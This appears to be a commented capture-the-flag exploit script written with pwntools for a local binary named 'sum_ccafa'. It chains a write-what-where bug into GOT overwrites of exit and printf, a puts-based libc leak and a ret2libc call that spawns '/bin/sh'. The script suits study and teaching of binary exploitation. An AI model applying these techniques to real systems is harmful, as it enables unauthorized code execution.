import pwn
import struct

# sum_ccafa is a 64-bit dynamically linked binary
# NX is on, there is a canary, ASLR is on

# This is a somewhat complicated exploit
# The binary gives us an easy write what where, allowing us to write the sum of some inputs to a destination that we can provide as input
# We are able to utilize this to overwrite exit() with the address of main, allowing for infinite passes
# Then, we overwrite printf's got with a rop gadget, to redirect execution into our inputs on the stack
# This allows us to execute a puts(puts got) rop, followed by a ret2libc bin/sh rop

target = pwn.process('./sum_ccafa')
# pwn.gdb.attach(target, gdbscript="b *0x4009bf")

target_elf = pwn.ELF('sum_ccafa')
libc_elf = pwn.ELF('/lib/x86_64-linux-gnu/libc.so.6')


# This binary has a loop which takes up to 6 numbers as input, giving it a 0 is how you stop writing numbers (write less than 6 numbers)
# The 6th number is also interpreted as a pointer, and the sum of all 6 numbers is written to that pointer
# If you do give it 6 numbers, it will call exit() instead of looping
# So, we have a write what where, because we can put whatever we want in the pointer, and control the exact value of the sum

########################################
#### Overwriting exit got with main ####
######################################## 

# The first step is to overwrite exit() with the starting address of main, so we can write what where multiple times
exit_got = target_elf.got['exit']
main_addr = target_elf.symbols['main']

target.sendline(str(main_addr).encode()) # Value we are trying to write (these first five could be in any order btw)
target.sendline(b'2') # 2 + -1 + -1 = 0
target.sendline(b'-1')
target.sendline(b'-1')
target.sendline(str(-1 * exit_got).encode()) # to keep the sum 0. exit_got + -exit_got = 0
target.sendline(str(exit_got).encode()) # Pointer we are writing to (6th value)

##############################################
#### Overwriting printf with a rop gadget ####
##############################################

# So now we have the ability to do unlimited write what where's, what next?
# We need to find a way to execute a rop chain

# Looking at the stack when printf is called at 0x4009bf, 
# we can see our number inputs are stored on the top of the stack in order

# Remember: the call instruction jumps execution to the target address AND pushes 
# the address of the next instruction (the return address) onto the top of the stack

# if we overwrite the printf got entry with a pop _; ret instruction, that return
# address on the top of the stack will get popped, and then we will return to the address on the top of the stack
# which will again be our input (because we just popped the ret addr back off)

# Note: it does not have to be a pop_rdi; ret instruction, it can be a pop any register; ret gadget,
# we just happen to already have need for a pop rdi ret gadget later, so we might as well use it again

pop_rdi = 0x400a43
printf_got = target_elf.got['printf']

target.sendline(str(pop_rdi).encode())
target.sendline(b'2')
target.sendline(b'-1')
target.sendline(b'-1')
target.sendline(str(-1 * printf_got).encode())
target.sendline(str(printf_got).encode())

##################################
#### puts(puts_got) rop chain ####
##################################

# So now the printf() call at 0x4009bf will return to the first of our inputs
# this essentially allows us to have 3 items of rop chain, followed by the address of a "call exit" instruction
# Which loops execution back to the start of main
# Just putting the address of main would in theory work, but it doesn't
# Something about the return address not getting pushed I beleive corrupts the stack later on

# We will rop to do a puts(puts got) leak
puts_plt = target_elf.symbols['puts']
puts_got = target_elf.got['puts']
libc_puts = libc_elf.symbols['puts']

target.sendline(str(pop_rdi).encode())
target.sendline(str(puts_got).encode())
target.sendline(str(puts_plt).encode())
target.sendline(str(0x4009a7).encode()) # Address of 'call exit' to bring us back to start of main: 0x4009a7
target.sendline(b'0') # 0 to end number sequence

target.recvuntil(b'2 3 4 0\n')
target.recvuntil(b'2 3 4 0\n')
target.recvuntil(b'2 3 4 0\n')

leak = target.recvline().strip(b'\n')
leak = struct.unpack("<Q", leak + b'\x00' * (8 - len(leak)))[0]

libc_base = leak - libc_puts
print(f"libc base: {hex(libc_base)}")

##########################################################
#### Calculating libc addrs and sending final payload ####
##########################################################

libc_system = libc_elf.symbols['system']
libc_bin_sh = next(libc_elf.search(b'/bin/sh'))

# Rop chain to call system("/bin/sh")
target.sendline(str(pop_rdi).encode())
target.sendline(str(libc_base + libc_bin_sh).encode())
target.sendline(str(libc_base + libc_system).encode())
target.sendline(b'0')

target.interactive()

